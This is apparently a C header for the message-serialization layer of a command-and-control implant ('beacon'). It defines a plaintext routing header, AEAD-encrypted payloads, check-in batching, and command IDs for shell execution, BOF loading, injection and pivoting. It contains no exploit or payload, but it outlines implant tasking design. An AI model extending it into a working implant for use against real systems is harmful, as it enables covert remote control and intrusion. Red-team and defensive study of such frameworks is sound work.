/*
 * Server message serialization API
 *
 * A "package" is a structured binary message. Modules build a package by
 * appending typed fields, then hand it to a transmit function which
 * encrypts the payload and ships it via the transport layer.
 *
 * Layers (top-down):
 *   modules / core         ← build packages
 *   package layer (this)   ← frame + encrypt
 *   crypto (AEAD)          ← confidentiality + integrity
 *   transport              ← move bytes
 *
 *
 * Lifecycle / ownership:
 *   - package_create*() allocates a package; caller owns it.
 *   - package_destroy() frees a package and its internal buffer.
 *   - package_transmit() takes ownership of the package; do not touch
 *     it after this call.
 *   - package_transmit_now() frees the package on return if
 *     pkg->destroy is set (the default for create*).
 *   - Response buffers returned by transmit_now / transmit_all are
 *     owned by the caller and must be freed.
 *
 * Thread safety: NOT thread-safe. The outgoing queue is shared mutable
 * state. If you ever call from multiple threads, serialize externally.
 */

#ifndef PACKAGE_H
#define PACKAGE_H

#include <stdint.h>
#include <stddef.h>
#include <wchar.h>


/* ─── Wire format ──────────────────────────────────────────────────────────
 *
 * Every transmitted buffer starts with this fixed-size header followed by
 * an optional payload. `length` covers everything after itself.
 *
 *   offset  size  field
 *   ──────  ────  ─────────────────────────────────────────────
 *     0      4    length     (all bytes after this field, big-endian)
 *     4      4    magic      (PACKAGE_MAGIC; validates wire format)
 *     8      2    version    (PACKAGE_PROTOCOL_VERSION)
 *    10      2    flags      (PKG_FLAG_* bits)
 *    12      4    agent_id   (which beacon)
 *    16      4    command    (PKG_CMD_*)
 *    20      4    request    (correlation: ties task ↔ result)
 *    24    ...    payload    (variable; encrypted if PKG_FLAG_ENCRYPTED)
 *
 * All multi-byte fields are big-endian on the wire.
 *
 * The header is ALWAYS plaintext so the server can route by agent_id
 * before having to decrypt. Encryption (when enabled) covers only the
 * payload — bytes from offset PACKAGE_HEADER_SIZE onward.
 *
 * For PKG_CMD_INITIALIZE / PKG_FLAG_KEYEXCHANGE, an extra PACKAGE_KEYEX_SIZE
 * bytes following the header are ALSO plaintext (they carry the key
 * material being exchanged — cannot be encrypted with the key they
 * contain).
 */

#define PACKAGE_MAGIC              0xDEADBEEFu   /* change in real builds */
#define PACKAGE_PROTOCOL_VERSION   1
#define PACKAGE_HEADER_SIZE        24
#define PACKAGE_KEYEX_SIZE         48            /* extra plaintext on KEYEX */
#define PACKAGE_MAX_REQUEST_SIZE   (4 * 1024 * 1024)   /* hard cap per send */


/* ─── Flag bits (header.flags) ─────────────────────────────────────────── */

#define PKG_FLAG_ENCRYPTED      0x0001   /* payload is AEAD-encrypted */
#define PKG_FLAG_BATCH          0x0002   /* payload contains N sub-packages */
#define PKG_FLAG_ERROR          0x0004   /* this is an error report */
#define PKG_FLAG_FRAGMENT       0x0008   /* part of a larger message (future) */
#define PKG_FLAG_KEYEXCHANGE    0x0010   /* contains key material */


/* ─── Command IDs ─────────────────────────────────────────────────────────
 *
 * Add commands here and KEEP THE VALUES STABLE. Never reuse a retired ID;
 * version skew between beacon and server builds gets ugly otherwise.
 *
 * Range conventions:
 *   0x0000 – 0x00FF : lifecycle      (init, exit, checkin)
 *   0x0100 – 0x01FF : tasking        (get tasks, task output, errors)
 *   0x0200 – 0x02FF : process/token
 *   0x0300 – 0x03FF : filesystem
 *   0x0400 – 0x04FF : BOF / loaders / injection
 *   0x0500 – 0x05FF : network / pivot
 *   0xFF00 – 0xFFFF : reserved
 */
enum package_command {
    PKG_CMD_INITIALIZE        = 0x0001,
    PKG_CMD_CHECKIN           = 0x0002,
    PKG_CMD_EXIT              = 0x0003,

    PKG_CMD_GET_TASKS         = 0x0100,
    PKG_CMD_TASK_OUTPUT       = 0x0101,
    PKG_CMD_TASK_ERROR        = 0x0102,
    PKG_CMD_TASK_COMPLETE     = 0x0103,
    PKG_CMD_TASK_DROPPED      = 0x0104,

    PKG_CMD_EXEC_SHELL       = 0x0110,
    PKG_CMD_BOF_EXECUTE       = 0x0400,
    PKG_CMD_BOF_OUTPUT        = 0x0401,

    /* extend as you add commands */
};

/* ─── Header structure ──────────────────────────────────────────────────── */

typedef struct package_header {
    uint32_t  length;        /* bytes after the length field itself */
    uint32_t  magic;
    uint16_t  version;
    uint16_t  flags;
    uint32_t  agent_id;
    uint32_t  command;
    uint32_t  request_id;
} package_header_t;


/* ─── In-memory package ───────────────────────────────────────────────────
 *
 * Used while building / queuing. Serialized to `buffer` as fields are
 * appended. Freed (or recycled, if destroy=0) after transmission.
 */
typedef struct package {
    uint8_t          *buffer;     /* wire bytes, header + payload    */
    size_t            length;     /* current used size of buffer     */
    size_t            capacity;   /* allocated size (for grow logic) */

    uint32_t          command;    /* PKG_CMD_*                       */
    uint32_t          request_id; /* correlation ID                  */
    uint16_t          flags;      /* PKG_FLAG_*                      */

    int               encrypt;    /* encrypt payload on send?        */
    int               destroy;    /* free after transmit?            */
    int               included;   /* set true once batched (internal)*/

    struct package   *next;       /* queue link (internal)           */
} package_t, *ppackage_t;


/* ─── Lifecycle ───────────────────────────────────────────────────────── */

/* Allocate a bare package (no header bytes written). */
ppackage_t  package_create(uint32_t command);

/* Allocate and write the standard 24-byte header. Use this for most. */
ppackage_t  package_create_with_metadata(uint32_t command);

/* Like create_with_metadata, but caller supplies the request ID. */
ppackage_t  package_create_with_request_id(uint32_t command, uint32_t request_id);

/* Must be called once after registration so the package layer knows the
 * agent's UUID for the 4‑byte agent_id hash in every header. */
void package_set_agent_id(const char *id);

/* Free a package and its buffer. Safe on NULL. */
void        package_destroy(ppackage_t pkg);


/* ─── Typed field appenders ───────────────────────────────────────────────
 *
 * Multi-byte values are written big-endian. Variable-length appenders
 * prepend a u32 length so the reader knows how much to consume.
 * `package_add_pad` writes raw bytes with NO length prefix — for
 * embedding sub-packages or pre-framed blobs.
 *
 * Behavior on NULL pkg: silent no-op (lets chained builders survive a
 * failed create*). Real code should still check create*() return.
 */

void  package_add_int32  (ppackage_t pkg, uint32_t        value);
void  package_add_int64  (ppackage_t pkg, uint64_t        value);
void  package_add_bool   (ppackage_t pkg, int             value);
void  package_add_ptr    (ppackage_t pkg, const void     *ptr);

void  package_add_bytes  (ppackage_t pkg, const uint8_t  *data, size_t len);
void  package_add_string (ppackage_t pkg, const char     *str);   /* ANSI    */
void  package_add_wstring(ppackage_t pkg, const wchar_t  *str);   /* UTF-16LE */

void  package_add_pad    (ppackage_t pkg, const uint8_t  *data, size_t len);


/* ─── Transmission ────────────────────────────────────────────────────────
 *
 *   package_transmit          Append to outgoing queue. No I/O. The package
 *                             is sent on the next call to transmit_all.
 *                             Used by handlers that produce results during
 *                             task execution.
 *
 *   package_transmit_now      Encrypt, send immediately, optionally receive
 *                             a decrypted response. Used for the initial
 *                             handshake / key exchange.
 *                             Returns 0 on success, non-zero on failure.
 *
 *   package_transmit_all      Drain the outgoing queue, batch every queued
 *                             package into one request (under
 *                             PACKAGE_MAX_REQUEST_SIZE), send, decrypt the
 *                             response. Called once per check-in cycle.
 *                             Returns 0 on success, non-zero on failure.
 *
 * Response buffers (when requested) are owned by the caller and must be
 * freed with the standard free() (or whatever your allocator pairs with
 * the package implementation's allocator).
 */

void  package_transmit(ppackage_t pkg);

int   package_transmit_now(ppackage_t   pkg,
                           uint8_t    **out_response,      /* may be NULL */
                           size_t      *out_response_len); /* may be NULL */

int   package_transmit_all(uint8_t    **out_response,
                           size_t      *out_response_len);


/* ─── Convenience: error reporting ─────────────────────────────────────── */

/* Build and queue a standard error package: request_id + error_code.
 * Sent on next transmit_all. */
void  package_transmit_error(uint32_t request_id, uint32_t error_code);


/* ─── Reader API ──────────────────────────────────────────────────────────
 *
 * Lightweight cursor over an incoming buffer. The reader does NOT own
 * `data`; the caller manages its lifetime. All read_* return non-zero
 * on success, zero on out-of-bounds.
 *
 * The reader tracks position internally so successive reads consume
 * sequentially. Designed to mirror the appender API on the writer side.
 */
typedef struct package_reader {
    const uint8_t   *data;
    size_t           length;
    size_t           offset;
} package_reader_t;

void  package_reader_init    (package_reader_t *r, const uint8_t *data, size_t len);

int   package_read_int32     (package_reader_t *r, uint32_t  *out);
int   package_read_int64     (package_reader_t *r, uint64_t  *out);
int   package_read_bool      (package_reader_t *r, int       *out);

/* Length-prefixed bytes/strings. Out pointers reference INTO the reader's
 * buffer — do not free them; do not use them after the buffer is freed. */
int   package_read_bytes     (package_reader_t *r, const uint8_t **out, size_t *out_len);
int   package_read_string    (package_reader_t *r, const char    **out, size_t *out_len);
int   package_read_wstring   (package_reader_t *r, const wchar_t **out, size_t *out_len);
/* ─── Reader API (extended) ───────────────────────────────────────────── */

/* Parse the fixed 24‑byte header from the reader’s buffer.  On success
 * the reader’s offset is advanced to PACKAGE_HEADER_SIZE so that
 * subsequent `package_read_*` calls consume the payload sequentially.
 * Returns non‑zero on success, zero if the buffer is too short. */
int package_reader_parse_header(package_reader_t *r, package_header_t *hdr);


#endif /* PACKAGE_H */